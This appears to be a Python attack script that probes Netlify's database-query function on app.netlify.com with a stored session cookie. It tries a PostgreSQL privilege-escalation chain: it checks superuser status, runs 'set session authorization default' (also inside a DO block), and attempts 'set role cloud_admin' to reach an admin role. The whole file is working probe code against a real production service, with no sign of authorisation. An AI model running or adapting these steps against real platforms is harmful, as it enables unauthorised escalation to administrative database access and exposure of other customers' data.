# -*- coding: utf-8 -*-
"""波14:session_user 提权链验证!
E1 session_user vs current_user / E2 SET SESSION AUTHORIZATION DEFAULT / E3 SET ROLE cloud_admin
若 session_user=cloud_admin -> 升权面;每请求独立连接,单条 SQL 内测(DO 块编排多步)
"""
import http.client, ssl, gzip, brotli, json, sys, time
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_NET

SITE_ID = '04f08ff6-f274-47ac-b6d7-5fb1e055f3b4'
ctx = ssl.create_default_context()
P = '/.netlify/functions/database-query'


def q(sql, timeout=60):
    t0 = time.time()
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=timeout)
    h = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0',
         'Accept-Encoding': 'br, gzip', 'Accept': 'application/json', 'Cookie': COOKIE_NET,
         'Content-Type': 'application/json'}
    body = {'siteId': SITE_ID, 'action': 'query', 'sql': sql}
    conn.request('POST', P, body=json.dumps(body).encode(), headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br':
        raw = brotli.decompress(raw)
    elif enc == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    conn.close()
    return st, raw[:600].decode('utf-8', 'ignore'), round(time.time() - t0, 1)


# E1: 身份基线
s, b, dt = q("select session_user, current_user, (select rolsuper from pg_roles where rolname = session_user) as sess_super, (select rolsuper from pg_roles where rolname = current_user) as cur_super")
print('E1_identity    [%d] %.1fs %s' % (s, dt, b[:300]))
# E2: SET SESSION AUTHORIZATION DEFAULT(回 session_user)
s, b, dt = q("set session authorization default")
print('E2_set_default [%d] %.1fs %s' % (s, dt, b[:200]))
# E3: 升权后身份
s, b, dt = q("select session_user, current_user, (select rolsuper from pg_roles where rolname = current_user) as cur_super")
print('E3_after       [%d] %.1fs %s' % (s, dt, b[:300]))
# E4: DO 块内编排:set + 探测
s, b, dt = q("do $$ begin execute 'set session authorization default'; end $$")
print('E4_do_set      [%d] %.1fs %s' % (s, dt, b[:200]))
# E5: SET ROLE cloud_admin(若 session_user 是 cloud_admin,set role 需要成员,试试)
s, b, dt = q("set role cloud_admin")
print('E5_set_role_ca [%d] %.1fs %s' % (s, dt, b[:200]))
# E6: 直连(postgres 库 psycopg)的 session_user 检查
s, b, dt = q("select 'via wrapper ok'")
print('E6_alive       [%d] %.1fs %s' % (s, dt, b[:100]))
